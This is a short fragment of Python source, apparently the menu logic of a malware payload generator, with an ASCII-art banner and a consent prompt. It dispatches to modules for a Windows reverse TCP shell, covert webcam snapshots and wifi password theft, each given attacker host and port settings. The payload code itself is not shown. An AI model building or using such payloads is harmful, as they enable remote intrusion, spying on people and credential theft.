     ...
     -///:``-.`     `.-:///:`     `/yyyy.   `oyyyy+.    `.+yyyy+`  :yyyy.     `     ````.syyy+``syyyo   
        ...
        if agreement == "Y" or agreement == "y":
            if options.payload == "windows/CyberShell/rev_tcp":
                winrevtcp.antivirus(lport=options.lport, lhost=options.lhost, filename=options.file)
            elif options.payload == "spy/webcam/snap":
                webcam_spy.antivirus(lport=options.lport, lhost=options.lhost, filename=options.file)
            elif options.payload == "malware/wifi/password":
                passwrd.antivirus(lport=options.lport, lhost=options.lhost, filename=options.file)
        else:
